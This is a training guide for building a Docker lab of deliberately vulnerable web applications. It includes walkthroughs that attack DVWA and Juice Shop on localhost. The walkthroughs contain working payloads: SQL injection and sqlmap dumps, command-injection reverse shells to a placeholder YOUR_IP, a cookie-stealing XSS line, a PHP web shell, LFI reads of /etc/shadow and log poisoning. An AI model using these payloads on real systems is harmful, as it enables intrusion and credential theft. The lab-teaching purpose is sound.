---
title: Docker Web Security Lab Setup
description: Complete guide to building web security labs with Docker — OWASP vulnerable applications, API targets, CMS exploitation environments, testing walkthroughs, and attack examples.
navigation:
  icon: i-lucide-container
---

## Why Docker for Security Labs?

::card
---
icon: i-lucide-info
title: Docker Security Labs
---
**Docker** transforms web security lab setup from **hours of manual configuration** into **single-command deployments**. Each vulnerable application runs in an **isolated container** — lightweight, reproducible, and disposable. Break something? Destroy and recreate in seconds. Need 10 different vulnerable apps? One `docker-compose up` command. Docker is the **modern pentester's lab foundation** — fast, portable, and infinitely expandable.
::

::callout
---
icon: i-lucide-lightbulb
color: primary
---
With Docker, you can deploy **50+ vulnerable web applications** on a single machine with **4 GB RAM**. No VMs, no ISOs, no disk space waste. Spin up, hack, destroy, repeat. **This is how professionals practice.**
::

### Docker vs Traditional VMs for Labs

::card-group
  ::card
  ---
  icon: i-lucide-container
  title: "Docker Containers ✅"
  color: green
  ---
  - Start in **seconds** (vs minutes for VMs)
  - Use **50-200 MB** RAM per app (vs 1-4 GB per VM)
  - **Single command** deployment
  - Easy **version control** and reproducibility
  - Run **20+ apps** on 8 GB RAM
  - **Destroy and rebuild** instantly
  - Share via `docker-compose.yml` files
  - Perfect for **web application** security
  ::

  ::card
  ---
  icon: i-lucide-monitor
  title: "Traditional VMs"
  color: orange
  ---
  - Start in **minutes**
  - Use **1-4 GB** RAM per machine
  - Complex setup and configuration
  - Require large disk images (10-60 GB each)
  - Run **3-5 VMs** on 8 GB RAM
  - Snapshots for revert (larger, slower)
  - Share via OVA files (multi-GB)
  - Better for **OS-level / network** attacks
  ::
::

---

## Docker Installation & Setup

### Install Docker

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux (Ubuntu/Debian/Kali)"}
  ```bash [Terminal]
  # ─── INSTALL DOCKER ENGINE ───
  # Remove old versions
  sudo apt remove docker docker-engine docker.io containerd runc 2>/dev/null

  # Install prerequisites
  sudo apt update
  sudo apt install -y ca-certificates curl gnupg lsb-release

  # Add Docker GPG key
  sudo install -m 0755 -d /etc/apt/keyrings
  curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
    sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
  sudo chmod a+r /etc/apt/keyrings/docker.gpg

  # Add Docker repository
  echo "deb [arch=$(dpkg --print-architecture) \
    signed-by=/etc/apt/keyrings/docker.gpg] \
    https://download.docker.com/linux/ubuntu \
    $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
    sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

  # Install Docker
  sudo apt update
  sudo apt install -y docker-ce docker-ce-cli containerd.io \
    docker-buildx-plugin docker-compose-plugin

  # ─── KALI LINUX (Alternative) ───
  sudo apt install -y docker.io docker-compose
  
  # ─── POST-INSTALL ───
  # Add user to docker group (no sudo needed)
  sudo usermod -aG docker $USER
  newgrp docker   # Apply immediately (or logout/login)

  # Enable Docker on boot
  sudo systemctl enable docker
  sudo systemctl start docker

  # ─── VERIFY ───
  docker --version
  docker compose version
  docker run hello-world
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="macOS"}
  ```bash [Terminal]
  # ─── INSTALL DOCKER DESKTOP ───
  # Download: https://www.docker.com/products/docker-desktop/

  # Or via Homebrew
  brew install --cask docker

  # Launch Docker Desktop from Applications
  # Wait for whale icon in menu bar

  # Verify
  docker --version
  docker compose version
  docker run hello-world

  # ─── RECOMMENDED SETTINGS ───
  # Docker Desktop → Preferences → Resources
  # CPUs:   4
  # Memory: 8 GB (increase if possible)
  # Disk:   60 GB
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Windows"}
  ```powershell [PowerShell (Admin)]
  # ─── INSTALL DOCKER DESKTOP ───
  # Download: https://www.docker.com/products/docker-desktop/

  # Prerequisites:
  # 1. Enable WSL2 (Windows Subsystem for Linux)
  wsl --install
  # Restart computer

  # 2. Install Docker Desktop
  # Run installer → enable WSL2 backend

  # 3. Verify
  docker --version
  docker compose version
  docker run hello-world

  # ─── RECOMMENDED SETTINGS ───
  # Docker Desktop → Settings → Resources → WSL Integration
  # Enable for your WSL2 distro (Ubuntu/Kali)
  # Memory: 8 GB
  # CPUs:   4
  ```
  :::
::

### Docker Networking for Labs

::steps{level="4"}

#### Create Lab Network

```bash [Terminal]
# ─── CREATE ISOLATED LAB NETWORK ───
docker network create --driver bridge \
  --subnet=172.20.0.0/16 \
  --gateway=172.20.0.1 \
  web-security-lab

# Verify
docker network ls
docker network inspect web-security-lab

# ─── NETWORK ARCHITECTURE ───
# 172.20.0.0/16  — Lab network
# 172.20.0.1     — Gateway (Docker host)
# 172.20.1.x     — OWASP apps
# 172.20.2.x     — CMS targets
# 172.20.3.x     — API targets
# 172.20.4.x     — Custom apps
# 172.20.5.x     — Support services (DB, mail)
```

#### Docker Lab Topology

```text
═══════════════════════════════════════════════════════════════
             DOCKER WEB SECURITY LAB TOPOLOGY
═══════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────────────────┐
    │              HOST MACHINE (Kali/Ubuntu)            │
    │              Browser + Burp Suite                  │
    │              http://localhost:PORT                  │
    └──────────────────────┬─────────────────────────────┘
                           │
                    Docker Bridge Network
                    (172.20.0.0/16)
                           │
    ┌──────────────────────┼────────────────────────────┐
    │                      │                            │
    │  ┌──────────┐  ┌─────▼─────┐  ┌──────────┐       │
    │  │  DVWA    │  │ Juice Shop│  │ WebGoat  │       │
    │  │ :8081    │  │ :3000     │  │ :8082    │       │
    │  └──────────┘  └───────────┘  └──────────┘       │
    │                                                   │
    │  ┌──────────┐  ┌───────────┐  ┌──────────┐       │
    │  │  bWAPP   │  │ Mutillidae│  │  crAPI   │       │
    │  │ :8083    │  │ :8084     │  │ :8888    │       │
    │  └──────────┘  └───────────┘  └──────────┘       │
    │                                                   │
    │  ┌──────────┐  ┌───────────┐  ┌──────────┐       │
    │  │WordPress │  │  Joomla   │  │  Drupal  │       │
    │  │ :8090    │  │ :8091     │  │ :8092    │       │
    │  └──────────┘  └───────────┘  └──────────┘       │
    │                                                   │
    │  ┌──────────┐  ┌───────────┐  ┌──────────┐       │
    │  │  MySQL   │  │  Mongo    │  │  Redis   │       │
    │  │ :3306    │  │ :27017    │  │ :6379    │       │
    │  └──────────┘  └───────────┘  └──────────┘       │
    │                                                   │
    └───────────────────────────────────────────────────┘
```

::

---

## The Complete Docker Compose Lab

::note
This single `docker-compose.yml` file deploys **20+ vulnerable web applications** with one command. Copy this file and run `docker compose up -d`.
::

### Master Docker Compose File

::code-collapse
```yaml [docker-compose.yml]
# ═══════════════════════════════════════════════════════
#  WEB SECURITY LAB — MASTER DOCKER COMPOSE
#  Usage: docker compose up -d
#  Stop:  docker compose down
#  Reset: docker compose down -v && docker compose up -d
# ═══════════════════════════════════════════════════════

version: '3.8'

networks:
  web-security-lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16

services:

  # ═══════════════════════════════════════
  #  OWASP VULNERABLE APPLICATIONS
  # ═══════════════════════════════════════

  # ─── DVWA (Damn Vulnerable Web App) ───
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8081:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.10
    restart: unless-stopped

  # ─── OWASP Juice Shop ───
  juice-shop:
    image: bkimminich/juice-shop
    container_name: juice-shop
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=unsafe
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.11
    restart: unless-stopped

  # ─── OWASP WebGoat ───
  webgoat:
    image: webgoat/webgoat
    container_name: webgoat
    ports:
      - "8082:8080"
      - "9090:9090"
    environment:
      - WEBGOAT_HOST=0.0.0.0
      - WEBGOAT_PORT=8080
      - TZ=UTC
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.12
    restart: unless-stopped

  # ─── bWAPP (Buggy Web Application) ───
  bwapp:
    image: raesene/bwapp
    container_name: bwapp
    ports:
      - "8083:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.13
    restart: unless-stopped

  # ─── Mutillidae II ───
  mutillidae:
    image: citizenstig/nowasp
    container_name: mutillidae
    ports:
      - "8084:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.14
    restart: unless-stopped

  # ─── OWASP NodeGoat ───
  nodegoat:
    image: owasp/nodegoat
    container_name: nodegoat
    ports:
      - "4000:4000"
    environment:
      - MONGODB_URI=mongodb://mongo-nodegoat:27017/nodegoat
    depends_on:
      - mongo-nodegoat
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.15
    restart: unless-stopped

  mongo-nodegoat:
    image: mongo:4.4
    container_name: mongo-nodegoat
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.15
    restart: unless-stopped

  # ─── OWASP WebGoat.NET ───
  webgoat-net:
    image: yourfavhackerr/webgoat.net
    container_name: webgoat-net
    ports:
      - "8085:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.16
    restart: unless-stopped

  # ─── OWASP RailsGoat ───
  railsgoat:
    image: owasp/railsgoat
    container_name: railsgoat
    ports:
      - "3002:3000"
    networks:
      web-security-lab:
        ipv4_address: 172.20.1.17
    restart: unless-stopped

  # ═══════════════════════════════════════
  #  API SECURITY TARGETS
  # ═══════════════════════════════════════

  # ─── OWASP crAPI (Completely Ridiculous API) ───
  crapi-web:
    image: crapi/crapi
    container_name: crapi
    ports:
      - "8888:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.3.10
    restart: unless-stopped

  # ─── VAmPI (Vulnerable API) ───
  vampi:
    image: erev0s/vampi
    container_name: vampi
    ports:
      - "5001:5000"
    environment:
      - vulnerable=1
    networks:
      web-security-lab:
        ipv4_address: 172.20.3.11
    restart: unless-stopped

  # ─── DVGA (Damn Vulnerable GraphQL App) ───
  dvga:
    image: dolevf/dvga
    container_name: dvga
    ports:
      - "5013:5013"
    environment:
      - WEB_HOST=0.0.0.0
    networks:
      web-security-lab:
        ipv4_address: 172.20.3.12
    restart: unless-stopped

  # ─── Generic Vulnerable API ───
  vulnerable-api:
    image: mkam/vulnerable-api
    container_name: vulnerable-api
    ports:
      - "8686:8081"
    networks:
      web-security-lab:
        ipv4_address: 172.20.3.13
    restart: unless-stopped

  # ═══════════════════════════════════════
  #  CMS TARGETS
  # ═══════════════════════════════════════

  # ─── WordPress (with MySQL) ───
  wordpress:
    image: wordpress:latest
    container_name: wordpress
    ports:
      - "8090:80"
    environment:
      WORDPRESS_DB_HOST: wp-db:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress123
      WORDPRESS_DB_NAME: wordpress
    depends_on:
      - wp-db
    networks:
      web-security-lab:
        ipv4_address: 172.20.2.10
    restart: unless-stopped

  wp-db:
    image: mysql:5.7
    container_name: wp-db
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress123
    volumes:
      - wp-db-data:/var/lib/mysql
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.10
    restart: unless-stopped

  # ─── Joomla (with MySQL) ───
  joomla:
    image: joomla:latest
    container_name: joomla
    ports:
      - "8091:80"
    environment:
      JOOMLA_DB_HOST: joomla-db
      JOOMLA_DB_USER: joomla
      JOOMLA_DB_PASSWORD: joomla123
      JOOMLA_DB_NAME: joomla
    depends_on:
      - joomla-db
    networks:
      web-security-lab:
        ipv4_address: 172.20.2.11
    restart: unless-stopped

  joomla-db:
    image: mysql:5.7
    container_name: joomla-db
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword
      MYSQL_DATABASE: joomla
      MYSQL_USER: joomla
      MYSQL_PASSWORD: joomla123
    volumes:
      - joomla-db-data:/var/lib/mysql
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.11
    restart: unless-stopped

  # ─── Drupal (with PostgreSQL) ───
  drupal:
    image: drupal:9
    container_name: drupal
    ports:
      - "8092:80"
    depends_on:
      - drupal-db
    networks:
      web-security-lab:
        ipv4_address: 172.20.2.12
    restart: unless-stopped

  drupal-db:
    image: postgres:13
    container_name: drupal-db
    environment:
      POSTGRES_DB: drupal
      POSTGRES_USER: drupal
      POSTGRES_PASSWORD: drupal123
    volumes:
      - drupal-db-data:/var/lib/postgresql/data
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.12
    restart: unless-stopped

  # ═══════════════════════════════════════
  #  SPECIALIZED VULNERABLE APPS
  # ═══════════════════════════════════════

  # ─── Hackazon (Realistic E-Commerce) ───
  hackazon:
    image: ianwijaya/hackazon
    container_name: hackazon
    ports:
      - "8093:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.10
    restart: unless-stopped

  # ─── XVWA (Xtreme Vulnerable Web App) ───
  xvwa:
    image: tuxotron/xvwa
    container_name: xvwa
    ports:
      - "8094:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.11
    restart: unless-stopped

  # ─── WrongSecrets (Secrets Management) ───
  wrongsecrets:
    image: jeroenwillemsen/wrongsecrets:latest-no-vault
    container_name: wrongsecrets
    ports:
      - "8095:8080"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.12
    restart: unless-stopped

  # ─── Damn Vulnerable Web Sockets ───
  dvws:
    image: tssoffsec/dvws-node
    container_name: dvws
    ports:
      - "8096:8080"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.13
    restart: unless-stopped

  # ═══════════════════════════════════════
  #  CVE PRACTICE ENVIRONMENTS
  # ═══════════════════════════════════════

  # ─── Shellshock (CVE-2014-6271) ───
  shellshock:
    image: hmlio/vaas-cve-2014-6271
    container_name: shellshock
    ports:
      - "8100:80"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.20
    restart: unless-stopped

  # ─── Heartbleed (CVE-2014-0160) ───
  heartbleed:
    image: hmlio/vaas-cve-2014-0160
    container_name: heartbleed
    ports:
      - "8101:443"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.21
    restart: unless-stopped

  # ─── Log4Shell (CVE-2021-44228) ───
  log4shell:
    image: ghcr.io/christophetd/log4shell-vulnerable-app
    container_name: log4shell
    ports:
      - "8102:8080"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.22
    restart: unless-stopped

  # ─── Spring4Shell (CVE-2022-22965) ───
  spring4shell:
    image: reznok/aspring4shell-poc
    container_name: spring4shell
    ports:
      - "8103:8080"
    networks:
      web-security-lab:
        ipv4_address: 172.20.4.23
    restart: unless-stopped

  # ═══════════════════════════════════════
  #  SUPPORT SERVICES
  # ═══════════════════════════════════════

  # ─── phpMyAdmin (DB management) ───
  phpmyadmin:
    image: phpmyadmin/phpmyadmin
    container_name: phpmyadmin
    ports:
      - "8880:80"
    environment:
      PMA_HOSTS: wp-db,joomla-db
      PMA_USER: root
      PMA_PASSWORD: rootpassword
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.20
    restart: unless-stopped

  # ─── Standalone MySQL (direct testing) ───
  mysql-target:
    image: mysql:5.7
    container_name: mysql-target
    ports:
      - "3307:3306"
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: testdb
      MYSQL_USER: admin
      MYSQL_PASSWORD: admin123
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.30
    restart: unless-stopped

  # ─── Redis (no auth — intentionally insecure) ───
  redis-target:
    image: redis:6
    container_name: redis-target
    ports:
      - "6379:6379"
    command: redis-server --protected-mode no
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.31
    restart: unless-stopped

  # ─── MongoDB (no auth — intentionally insecure) ───
  mongo-target:
    image: mongo:4.4
    container_name: mongo-target
    ports:
      - "27017:27017"
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.32
    restart: unless-stopped

  # ─── MailHog (Email capture) ───
  mailhog:
    image: mailhog/mailhog
    container_name: mailhog
    ports:
      - "1025:1025"
      - "8025:8025"
    networks:
      web-security-lab:
        ipv4_address: 172.20.5.40
    restart: unless-stopped

volumes:
  wp-db-data:
  joomla-db-data:
  drupal-db-data:
```
::

### Deploy the Lab

```bash [Terminal]
# ─── CREATE PROJECT DIRECTORY ───
mkdir -p ~/web-security-lab
cd ~/web-security-lab

# ─── SAVE docker-compose.yml (above) ───
# Copy the docker-compose.yml file above into this directory

# ─── DEPLOY EVERYTHING ───
docker compose up -d

# ─── CHECK STATUS ───
docker compose ps

# ─── VIEW LOGS ───
docker compose logs -f            # All containers
docker compose logs -f dvwa       # Specific container
docker compose logs -f juice-shop

# ─── STOP ALL ───
docker compose down

# ─── STOP + REMOVE DATA (full reset) ───
docker compose down -v

# ─── RESTART SPECIFIC APP ───
docker compose restart dvwa

# ─── DEPLOY ONLY SPECIFIC APPS ───
docker compose up -d dvwa juice-shop webgoat
```

### Quick Access Reference

::collapsible

| Application | URL | Credentials | Category |
|------------|-----|-------------|----------|
| **DVWA** | `http://localhost:8081` | `admin` / `password` | OWASP Web Vulns |
| **Juice Shop** | `http://localhost:3000` | *(register)* | OWASP Modern Web |
| **WebGoat** | `http://localhost:8082/WebGoat` | *(register)* | OWASP Training |
| **bWAPP** | `http://localhost:8083/install.php` | `bee` / `bug` | Web Vulns |
| **Mutillidae** | `http://localhost:8084/mutillidae` | *(open)* | OWASP Top 10 |
| **NodeGoat** | `http://localhost:4000` | *(register)* | Node.js Vulns |
| **crAPI** | `http://localhost:8888` | *(register)* | API Security |
| **VAmPI** | `http://localhost:5001` | *(API)* | API Vulns |
| **DVGA** | `http://localhost:5013` | *(open)* | GraphQL Vulns |
| **WordPress** | `http://localhost:8090` | *(setup wizard)* | CMS |
| **Joomla** | `http://localhost:8091` | *(setup wizard)* | CMS |
| **Drupal** | `http://localhost:8092` | *(setup wizard)* | CMS |
| **Hackazon** | `http://localhost:8093` | *(register)* | E-Commerce |
| **XVWA** | `http://localhost:8094` | *(open)* | Extreme Vulns |
| **WrongSecrets** | `http://localhost:8095` | *(open)* | Secrets Mgmt |
| **Shellshock** | `http://localhost:8100` | *(open)* | CVE Practice |
| **Heartbleed** | `https://localhost:8101` | *(open)* | CVE Practice |
| **Log4Shell** | `http://localhost:8102` | *(open)* | CVE Practice |
| **Spring4Shell** | `http://localhost:8103` | *(open)* | CVE Practice |
| **phpMyAdmin** | `http://localhost:8880` | `root` / `rootpassword` | DB Admin |
| **MailHog** | `http://localhost:8025` | *(open)* | Email Capture |
| **MySQL** | `localhost:3307` | `root` / `root` | Database |
| **Redis** | `localhost:6379` | *(no auth)* | Database |
| **MongoDB** | `localhost:27017` | *(no auth)* | Database |

::

---

## OWASP Application Deep Dive

### DVWA — Damn Vulnerable Web Application

::card
---
icon: i-lucide-shield-off
title: DVWA
---
The **most popular** vulnerable web application for learning web security. Covers the OWASP Top 10 with adjustable difficulty levels (Low, Medium, High, Impossible). Perfect for beginners learning **SQLi, XSS, Command Injection, File Upload, LFI, CSRF, and more**.
::

::steps{level="4"}

#### Setup & Configuration

```bash [Terminal]
# Deploy DVWA
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# Access: http://localhost:8081
# Login:  admin / password
# FIRST: Click "Create / Reset Database" at the bottom

# Set Security Level:
# DVWA Security → Set to "Low" → Submit
# Low       = No protection (learn the basics)
# Medium    = Some filtering (learn bypasses)
# High      = Strong filtering (advanced bypasses)
# Impossible = Secure code (see how to fix)
```

#### Testing — SQL Injection

```bash [Terminal]
# ═══════════════════════════════════════
#  DVWA SQL INJECTION (Security: Low)
# ═══════════════════════════════════════

# Navigate: http://localhost:8081/vulnerabilities/sqli/
# Input field: "User ID"

# ─── STEP 1: Detect SQLi ───
# Enter in the input field:
1' OR '1'='1
# If you see ALL users → vulnerable!

# ─── STEP 2: Determine column count ───
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
# Error at 3 → 2 columns exist

# ─── STEP 3: Extract database info ───
1' UNION SELECT database(), user()#
# Shows: dvwa, root@localhost

# ─── STEP 4: List all tables ───
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'#
# Shows: guestbook, users

# ─── STEP 5: List columns in users table ───
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'#
# Shows: user_id, first_name, last_name, user, password, avatar, last_login, failed_login

# ─── STEP 6: Dump credentials ───
1' UNION SELECT user, password FROM users#
# Shows username:md5hash pairs!

# ─── STEP 7: Crack with SQLMap ───
# Get your PHPSESSID cookie from browser (F12 → Storage → Cookies)
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --dbs --batch

# Dump users table
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa -T users --dump --batch
```

#### Testing — Command Injection

```bash [Terminal]
# ═══════════════════════════════════════
#  DVWA COMMAND INJECTION (Security: Low)
# ═══════════════════════════════════════

# Navigate: http://localhost:8081/vulnerabilities/exec/
# Input: "Enter an IP address" (intended for ping)

# ─── STEP 1: Normal usage ───
127.0.0.1
# Shows ping output — normal

# ─── STEP 2: Inject commands ───
127.0.0.1; id
# Shows ping output + "uid=33(www-data)..."

127.0.0.1; whoami
# www-data

127.0.0.1; cat /etc/passwd
# Full passwd file!

127.0.0.1; uname -a
# Linux kernel info

# ─── STEP 3: Reverse shell ───
# Start listener on host:
nc -lvnp 4444

# Inject reverse shell:
127.0.0.1; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# ─── MEDIUM DIFFICULTY BYPASS ───
# Medium filters ; and &&
# Use pipe instead:
127.0.0.1 | id
127.0.0.1 | cat /etc/passwd

# ─── HIGH DIFFICULTY BYPASS ───
# High filters more characters but misses newline
# Try:
127.0.0.1|id
# (no spaces around pipe)
```

#### Testing — XSS (Reflected)

```bash [Terminal]
# ═══════════════════════════════════════
#  DVWA REFLECTED XSS (Security: Low)
# ═══════════════════════════════════════

# Navigate: http://localhost:8081/vulnerabilities/xss_r/
# Input: "What's your name?"

# ─── STEP 1: Basic XSS ───
<script>alert('XSS')</script>
# Alert box appears → vulnerable!

# ─── STEP 2: Cookie stealing ───
<script>new Image().src="http://YOUR_IP:8888/steal?c="+document.cookie</script>

# Start listener first:
python3 -m http.server 8888
# You'll see the cookie in the request

# ─── STEP 3: DOM manipulation ───
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

# ─── MEDIUM BYPASS ───
# Medium filters <script> tags
# Use event handlers:
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

# Case variation:
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>

# ─── HIGH BYPASS ───
# High uses regex to filter script (case insensitive)
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
```

#### Testing — File Upload

```bash [Terminal]
# ═══════════════════════════════════════
#  DVWA FILE UPLOAD (Security: Low)
# ═══════════════════════════════════════

# Navigate: http://localhost:8081/vulnerabilities/upload/

# ─── STEP 1: Create PHP web shell ───
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# ─── STEP 2: Upload the shell ───
# Click "Browse" → select shell.php → Click "Upload"
# Success message: "../../hackable/uploads/shell.php succesfully uploaded!"

# ─── STEP 3: Access the shell ───
curl "http://localhost:8081/hackable/uploads/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://localhost:8081/hackable/uploads/shell.php?cmd=cat+/etc/passwd"
# Full /etc/passwd

# ─── STEP 4: Get reverse shell ───
# Listener:
nc -lvnp 4444

# Trigger:
curl "http://localhost:8081/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"

# ─── MEDIUM BYPASS ───
# Medium checks Content-Type header
# Intercept with Burp → change Content-Type to: image/jpeg
# Or rename: shell.php.jpg (some configs execute)

# ─── HIGH BYPASS ───
# High checks file extension AND first bytes (magic bytes)
# Create: GIF89a header + PHP code
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif
# Combine with LFI to execute:
# http://localhost:8081/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.php.gif&cmd=id
```

#### Testing — Local File Inclusion (LFI)

```bash [Terminal]
# ═══════════════════════════════════════
#  DVWA FILE INCLUSION (Security: Low)
# ═══════════════════════════════════════

# Navigate: http://localhost:8081/vulnerabilities/fi/?page=include.php

# ─── STEP 1: Basic LFI ───
http://localhost:8081/vulnerabilities/fi/?page=../../../../../../etc/passwd
# Shows /etc/passwd content!

# ─── STEP 2: Read sensitive files ───
http://localhost:8081/vulnerabilities/fi/?page=../../../../../../etc/shadow
http://localhost:8081/vulnerabilities/fi/?page=../../../../../../etc/hosts
http://localhost:8081/vulnerabilities/fi/?page=../../../../../../proc/self/environ

# ─── STEP 3: PHP filter (read source code) ───
http://localhost:8081/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/config/config.inc.php

# Decode the base64 output:
echo "BASE64_OUTPUT_HERE" | base64 -d
# Reveals database credentials!

# ─── STEP 4: RCE via PHP input ───
curl -X POST "http://localhost:8081/vulnerabilities/fi/?page=php://input" \
  --cookie "PHPSESSID=YOUR_SESSION; security=low" \
  -d '<?php system("id"); ?>'

# ─── STEP 5: RCE via log poisoning ───
# Poison Apache access log with PHP code
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost:8081/

# Include the log file
http://localhost:8081/vulnerabilities/fi/?page=../../../../../../var/log/apache2/access.log&cmd=id
```

::

### OWASP Juice Shop

::card
---
icon: i-lucide-cup-soda
title: Juice Shop
---
**The most modern** OWASP vulnerable application. Built with **Angular + Node.js + SQLite**. Features **100+ challenges** covering the OWASP Top 10, gamified with a scoreboard. Realistic single-page application (SPA) that mirrors real-world web apps. Essential for learning **modern web application attacks**.
::

::tabs
  :::tabs-item{icon="i-lucide-flag" label="Setup & Challenges"}
  ```bash [Terminal]
  # Deploy
  docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

  # Access: http://localhost:3000
  # Scoreboard: http://localhost:3000/#/score-board
  # (The scoreboard URL itself is a challenge to find!)

  # ─── CHALLENGE CATEGORIES ───
  # ⭐     — Trivial (warm-up)
  # ⭐⭐   — Easy
  # ⭐⭐⭐  — Medium
  # ⭐⭐⭐⭐ — Hard
  # ⭐⭐⭐⭐⭐ — Expert
  # ⭐⭐⭐⭐⭐⭐ — Insane

  # Categories:
  # - Injection (SQLi, NoSQLi, XSS)
  # - Broken Authentication
  # - Sensitive Data Exposure
  # - Broken Access Control
  # - Security Misconfiguration
  # - XSS
  # - Insecure Deserialization
  # - Improper Input Validation
  # - Cryptographic Issues
  # - Unvalidated Redirects
  ```
  :::

  :::tabs-item{icon="i-lucide-syringe" label="SQL Injection Attacks"}
  ```bash [Terminal]
  # ═══════════════════════════════════════
  #  JUICE SHOP — SQL INJECTION
  # ═══════════════════════════════════════

  # ─── LOGIN BYPASS (Challenge: Login Admin) ───
  # Navigate: http://localhost:3000/#/login
  # Email:    ' OR 1=1--
  # Password: anything
  # → Logs in as admin!

  # ─── LOGIN AS SPECIFIC USER ───
  # Email:    admin@juice-sh.op'--
  # Password: anything
  # → Logs in as admin (bypasses password check)

  # ─── SEARCH INJECTION ───
  # Navigate to search bar
  # Search: ')) UNION SELECT 1,2,3,4,5,6,7,8,9--
  # Test different column counts until no error

  # Via API:
  curl "http://localhost:3000/rest/products/search?q='))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--"

  # ─── EXTRACT ALL USERS ───
  curl "http://localhost:3000/rest/products/search?q='))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--"

  # ─── SQLMap ───
  sqlmap -u "http://localhost:3000/rest/products/search?q=test" \
    --dbms=sqlite --technique=U --dump --batch
  ```
  :::

  :::tabs-item{icon="i-lucide-key" label="Auth & Access Control"}
  ```bash [Terminal]
  # ═══════════════════════════════════════
  #  JUICE SHOP — AUTHENTICATION ATTACKS
  # ═══════════════════════════════════════

  # ─── ADMIN SECTION (Challenge: Access Admin Section) ───
  # Browse: http://localhost:3000/#/administration
  # But first you need to be logged in as admin (use SQLi above)

  # ─── FORGED FEEDBACK (Challenge: Post Feedback as Another User) ───
  # Intercept feedback submission in Burp
  # Change "UserId" to another user's ID
  curl -X POST http://localhost:3000/api/Feedbacks \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d '{"UserId":1,"comment":"hacked","rating":1}'

  # ─── ACCESS ANOTHER USER'S BASKET (IDOR) ───
  # Your basket: http://localhost:3000/rest/basket/2
  # Try: http://localhost:3000/rest/basket/1
  curl http://localhost:3000/rest/basket/1 \
    -H "Authorization: Bearer YOUR_TOKEN"
  # → See admin's basket!

  # ─── MANIPULATE BASKET ITEMS ───
  # Add item to another user's basket
  curl -X POST http://localhost:3000/api/BasketItems \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d '{"ProductId":1,"BasketId":1,"quantity":1}'

  # ─── PASSWORD RESET POISON ───
  # Intercept password reset request in Burp
  # Change Host header to your server
  # Reset link will be sent to attacker's domain

  # ─── FORGED JWT (Challenge: Forge a Coupon) ───
  # Decode JWT from Authorization header
  # Modify claims (role, email)
  # Use jwt_tool to test:
  jwt_tool YOUR_JWT -X a  # None algorithm
  jwt_tool YOUR_JWT -C -d /usr/share/wordlists/rockyou.txt  # Brute secret
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Information Disclosure"}
  ```bash [Terminal]
  # ═══════════════════════════════════════
  #  JUICE SHOP — INFORMATION DISCLOSURE
  # ═══════════════════════════════════════

